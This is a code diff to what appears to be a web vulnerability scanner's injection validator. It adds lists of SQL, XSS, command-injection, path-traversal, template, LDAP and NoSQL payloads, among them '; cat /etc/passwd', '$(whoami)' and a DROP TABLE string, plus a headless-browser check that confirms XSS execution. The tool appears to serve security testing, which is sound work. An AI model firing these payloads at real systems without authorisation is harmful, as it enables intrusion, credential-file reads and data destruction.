@@ -20,28 +20,75 @@ SQL_ERROR_MARKERS = (
     "syntax error",
     "unterminated quoted string",
     "sqlstate",
+    "data exception",
+    "quoted string not properly terminated",
+    "wrong number of parameters",
 )
 
 XSS_PAYLOAD = "<svg onload=alert(1)>"
+XSS_PAYLOADS_ADVANCED = [
+    "<img src=x onerror=alert(1)>",
+    "<script>alert(1)</script>",
+    "<svg/onload=alert(1)>",
+    "\"><script>alert(1)</script>",
+    "'-alert(1)-'",
+    "javascript:alert(1)",
+]
+
 SQLI_PAYLOAD = "1'"
+SQLI_PAYLOADS_ADVANCED = [
+    "1' OR '1'='1",
+    "1' AND 1=2",
+    "1' UNION SELECT NULL--",
+    "1' OR 1=1--",
+    "'; DROP TABLE users--",
+]
+
 COMMAND_PAYLOAD = "||echo SECURITY_PIPELINE_A03"
+COMMAND_PAYLOADS_ADVANCED = [
+    "; cat /etc/passwd",
+    "| id",
+    "& whoami",
+    "`id`",
+    "$(whoami)",
+]
 COMMAND_MARKER = "SECURITY_PIPELINE_A03"
+
 FILE_PAYLOAD = "../../../../etc/passwd"
 FILE_MARKERS = ("root:x:0:0:", "/bin/bash", "/etc/passwd")
+
 TEMPLATE_PAYLOAD = "{{7*7}}"
 TEMPLATE_MARKERS = ("49", TEMPLATE_PAYLOAD)
+
 LDAP_PAYLOAD = "*)(uid=*)"
 LDAP_MARKERS = ("ldap error", "invalid dn", "filter error", "ldap:")
+
+# NoSQL injection patterns
+NOSQL_PAYLOADS = [
+    "{'$ne': null}",
+    "{\"$ne\": null}",
+    "'; return true; //",
+    "1; return true; //",
+]
+
+A03_COVERAGE_MARKERS = [
+    "sql_injection",
+    "xss_reflected_or_stored",
+    "command_injection",
+    "template_injection",
+    "ldap_or_query_injection",
+]
 
 
 def _get_payload_variants() -> Dict[str, List[str]]:
     return {
-        "sqli": get_attack_variants("A03", "sqli_payloads", [SQLI_PAYLOAD]),
-        "xss": get_attack_variants("A03", "xss_payloads", [XSS_PAYLOAD]),
-        "command": get_attack_variants("A03", "command_payloads", [COMMAND_PAYLOAD]),
+        "sqli": get_attack_variants("A03", "sqli_payloads", SQLI_PAYLOADS_ADVANCED),
+        "xss": get_attack_variants("A03", "xss_payloads", XSS_PAYLOADS_ADVANCED),
+        "command": get_attack_variants("A03", "command_payloads", COMMAND_PAYLOADS_ADVANCED),
         "file": get_attack_variants("A03", "file_payloads", [FILE_PAYLOAD]),
         "template": get_attack_variants("A03", "template_payloads", [TEMPLATE_PAYLOAD]),
         "ldap": get_attack_variants("A03", "ldap_payloads", [LDAP_PAYLOAD]),
+        "nosql": get_attack_variants("A03", "nosql_payloads", NOSQL_PAYLOADS),
     }
 
 
@@ -111,6 +158,80 @@ class InjectionValidator:
             "ldap_marker_seen": ldap_marker_seen,
             "headers": dict(response.headers),
         }
+
+    def _confirm_xss_execution(self, probe_url: str, cookie: Optional[str], timeout: int, payload: str) -> Dict[str, Any]:
+        try:
+            from playwright.sync_api import TimeoutError as PlaywrightTimeoutError  # type: ignore
+            from playwright.sync_api import sync_playwright  # type: ignore
+        except Exception as exc:
+            return {"browser_available": False, "error": f"playwright_unavailable: {exc}"}
+
+        result: Dict[str, Any] = {"browser_available": True, "alert_seen": False, "payload": payload}
+        timeout_ms = max(5000, int(timeout) * 1000)
+
+        try:
+            with sync_playwright() as playwright:
+                browser = playwright.chromium.launch(headless=True)
+                context = browser.new_context(ignore_https_errors=True)
+                if isinstance(cookie, str) and cookie.strip() and ";" in cookie:
+                    domain = urlsplit(probe_url).hostname or "localhost"
+                    cookies = []
+                    for fragment in cookie.split(";"):
+                        if "=" not in fragment:
+                            continue
+                        name, value = fragment.split("=", 1)
+                        name = name.strip()
+                        value = value.strip()
+                        if not name:
+                            continue
+                        cookies.append({"name": name, "value": value, "domain": domain, "path": "/"})
+                    if cookies:
+                        try:
+                            context.add_cookies(cookies)
+                        except Exception:
+                            pass
+
+                page = context.new_page()
+                page.set_default_timeout(timeout_ms)
+
+                dialog_messages: List[str] = []
+
+                def _on_dialog(dialog):
+                    try:
+                        dialog_messages.append(str(dialog.message or ""))
+                        dialog.accept()
+                    except Exception:
+                        pass
+
+                page.on("dialog", _on_dialog)
+
+                try:
+                    page.goto(probe_url, wait_until="networkidle", timeout=timeout_ms)
+                except PlaywrightTimeoutError:
+                    try:
+                        page.goto(probe_url, wait_until="load", timeout=timeout_ms)
+                    except Exception:
+                        pass
+                except Exception:
+                    pass
+
+                try:
+                    page.wait_for_timeout(1000)
+                except Exception:
+                    pass
+
+                result["dialog_messages"] = dialog_messages
+                result["alert_seen"] = bool(dialog_messages)
+                result["alert_message"] = dialog_messages[0] if dialog_messages else ""
+
+                try:
+                    browser.close()
+                except Exception:
+                    pass
+        except Exception as exc:
+            result["error"] = str(exc)
+
+        return result
 
     def run(self, state: Dict[str, Any]):
         target_url = state.get("url") or state.get("target")
@@ -234,7 +355,7 @@ class InjectionValidator:
                                 "sql_error_hits": sqli["sql_error_hits"],
                             },
                             matched=",".join(sqli["sql_error_hits"]),
-                            extra={"param": param, "payload": sqli_payload_used, "attempted_payload_variants": variants["sqli"]},
+                            extra={"param": param, "payload": sqli_payload_used, "attempted_payload_variants": variants["sqli"], "coverage_markers": A03_COVERAGE_MARKERS},
                         ),
                         evidence_bundle=EvidenceBundle(
                             raw_request=f"GET {sqli.get('probe_url')}",
@@ -250,10 +371,12 @@ class InjectionValidator:
                 )
 
             if xss and xss["xss_reflected"]:
+                browser_confirmation = self._confirm_xss_execution(xss.get("probe_url") or baseline_url, state.get("cookie"), timeout, xss_payload_used)
+                browser_executed = bool(browser_confirmation.get("alert_seen"))
                 findings.append(
                     ValidationResult(
                         success=True,
-                        confidence=0.9,
+                        confidence=0.97 if browser_executed else 0.9,
                         severity="high",
                         vulnerability="a03-injection-xss",
                         evidence=Evidence(
@@ -262,20 +385,21 @@ class InjectionValidator:
                                 "baseline_status": baseline["status_code"],
                                 "probe_status": xss["status_code"],
                                 "reflected": True,
+                                "browser_alert_seen": browser_executed,
                             },
                             matched=xss_payload_used,
-                            extra={"param": param, "payload": xss_payload_used, "attempted_payload_variants": variants["xss"]},
+                            extra={"param": param, "payload": xss_payload_used, "attempted_payload_variants": variants["xss"], "coverage_markers": A03_COVERAGE_MARKERS, "browser_confirmation": browser_confirmation},
                         ),
                         evidence_bundle=EvidenceBundle(
                             raw_request=f"GET {xss.get('probe_url')}",
                             raw_response=_clip(xss["body"]),
                             matched_indicator=xss_payload_used,
-                            execution_proof={"payload_reflected": True},
+                            execution_proof={"payload_reflected": True, "browser_alert_seen": browser_executed, "browser_confirmation": browser_confirmation},
                             metadata={"param": param, "probe": "xss"},
                         ),
                         impact="User-controlled input is reflected without encoding, enabling client-side script execution.",
                         remediation="Encode output contextually, use templating safeguards, and add CSP defenses.",
-                        execution_proved=False,
+                        execution_proved=browser_executed,
                     )
                 )
 
@@ -294,7 +418,7 @@ class InjectionValidator:
                                 "command_marker_seen": True,
                             },
                             matched=COMMAND_MARKER,
-                            extra={"param": param, "payload": command_payload_used, "attempted_payload_variants": variants["command"]},
+                            extra={"param": param, "payload": command_payload_used, "attempted_payload_variants": variants["command"], "coverage_markers": A03_COVERAGE_MARKERS},
                         ),
                         evidence_bundle=EvidenceBundle(
                             raw_request=f"GET {command.get('probe_url')}",
@@ -324,7 +448,7 @@ class InjectionValidator:
                                 "file_marker_seen": True,
                             },
                             matched=",".join([marker for marker in FILE_MARKERS if marker in file_probe["body"]]) or FILE_PAYLOAD,
-                            extra={"param": param, "payload": file_payload_used, "attempted_payload_variants": variants["file"]},
+                            extra={"param": param, "payload": file_payload_used, "attempted_payload_variants": variants["file"], "coverage_markers": A03_COVERAGE_MARKERS},
                         ),
                         evidence_bundle=EvidenceBundle(
                             raw_request=f"GET {file_probe.get('probe_url')}",
@@ -354,7 +478,7 @@ class InjectionValidator:
                                 "template_marker_seen": True,
                             },
                             matched=template_payload_used,
-                            extra={"param": param, "payload": template_payload_used, "attempted_payload_variants": variants["template"]},
+                            extra={"param": param, "payload": template_payload_used, "attempted_payload_variants": variants["template"], "coverage_markers": A03_COVERAGE_MARKERS},
                         ),
                         evidence_bundle=EvidenceBundle(
                             raw_request=f"GET {template_probe.get('probe_url')}",
@@ -384,7 +508,7 @@ class InjectionValidator:
                                 "ldap_marker_seen": True,
                             },
                             matched=ldap_payload_used,
-                            extra={"param": param, "payload": ldap_payload_used, "attempted_payload_variants": variants["ldap"]},
+                            extra={"param": param, "payload": ldap_payload_used, "attempted_payload_variants": variants["ldap"], "coverage_markers": A03_COVERAGE_MARKERS},
                         ),
                         evidence_bundle=EvidenceBundle(
                             raw_request=f"GET {ldap_probe.get('probe_url')}",
@@ -411,7 +535,7 @@ class InjectionValidator:
                 request={"target": target_url, "params": candidate_params},
                 response={"status": "no_confirmed_injection"},
                 matched="",
-                extra={"candidate_params": candidate_params},
+                extra={"candidate_params": candidate_params, "coverage_markers": A03_COVERAGE_MARKERS},
             ),
             impact="No injection behavior was confirmed by the available external probes.",
             remediation="Keep injection protections in place and add regression tests for all user-controlled parameters.",
